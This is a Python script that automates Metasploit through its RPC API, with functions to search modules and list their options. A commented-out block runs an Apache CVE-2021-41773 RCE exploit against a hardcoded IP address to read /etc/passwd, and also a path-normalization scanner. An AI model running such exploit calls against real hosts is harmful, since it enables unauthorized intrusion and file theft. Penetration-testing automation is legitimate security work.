import sys
import logging
import time
from pymsfrpc.msfrpc import Msfrpc
from decouple import config

class AutoExploit(Msfrpc):
  def search_modules(self, opts):
    """
    Search for Metasploit modules by name.

    Args:
      opts (list of str): A list containing the name of the module(s) to search for.

    Returns:
      list: A list of modules that match the provided module name(s).

    Example:
      To search for modules with names containing 'exploit/multi/http':
      matching_modules = self.search_modules(['exploit/multi/http'])
    """
    modules = self.call("module.search", opts)
    # Display modules
    for module in modules:
      print(module)
    return modules

  def show_options(self, opts):
    """
    Show the options for a Metasploit module.

    Args:
        opts (list): A list containing the name of the module. The ModuleName must include module type prefix ("exploit/") or similar.

    Returns:
        dict: A dictionary containing the module's options.

    Example:
        To show the options for a module named 'exploit/multi/http/php_cgi_arg_injection':
        options = self.show_options(['exploit/multi/http/php_cgi_arg_injection'])
    """

    # convert opts to [Module_type, Module_name]
    opts = opts[0].split('/', 1)
    print(opts)

    module_options = self.call("module.options", opts)

    # check if response is error?
    if module_options.get('error') == True:
      logging.error(f"Error code {module_options.get('error_code')}")
      logging.error(f"Error message: {module_options.get('error_message').decode('utf-8')}")
      sys.exit(1)

    # Display options of module
    for option, attributes in module_options.items():
      # option name decode
      if isinstance(option, bytes):
        option = option.decode('utf-8')
      print(f"OPTION: {option}")

      # attribute of option
      for attribute, attribute_value in attributes.items():
        # field decode
        if isinstance(attribute, bytes):
          attribute = attribute.decode('utf-8')
        # field value decode
        if isinstance(attribute_value, bytes):
          attribute_value = attribute_value.decode('utf-8')
        print(f"{attribute}: {attribute_value}")
      print('-' * 40)

    return module_options

  def runTest(self):
    # arguments is required
    if len(sys.argv) < 2:
      logging.error("Tham so bat buoc")
      sys.exit(1)

    # Get arguments
    meth = sys.argv[1]
    opts = sys.argv[2:]

    # Call method
    if meth == "module.search":
      modules = self.search_modules(opts)
      print('=' * 40)
      module_info = self.show_options([modules[1].get(b'fullname')])
    elif meth == "module.options":
      module_info = self.show_options(opts)

  # def runTest(self):
  #   # execute
  #   # job_execute = self.call("module.execute", ["auxiliary","scanner/http/apache_normalize_path",{"RHOST":"144.91.100.145","RPORT":"80"}])
  #   # job_execute = self.call("module.execute", ["exploit","multi/http/apache_rce_cve2021_41773",{"RHOST":"144.91.100.145","LHOST":"100.64.100.6","RPORT":"80","ACTION":"READ_FILE","FILE":"/etc/passwd","TARGETURI":"/cgi-bin"}])
  #   # print("job_execute: ",job_execute)
  #   # show job
  #   # job_detail = self.call("job.info",[job_execute.get(b'job_id')])
  #   # print("job detail: --- ", job_detail)
    
  #   print (self.call("module.results",[b"FBCYJo5Bf9ii0PEelEfmphhM"]))
  #   # # kill job
  #   # job_kill = self.call("job.stop",[job_execute.get(b'job_id')])
  #   # print(job_kill)

  #   # list of job
  #   print("job list:", self.call("job.list",[]))
  #   print("results list:", self.call("module.running_stats",[]))
  #   print ("console: ", self.call("db.clients",[{}]))



if __name__ == "__main__":
  auto_exploit = AutoExploit({})
  auto_exploit.login(config('USER_USERNAME'), config('USER_PASSWORD'))
  auto_exploit.runTest()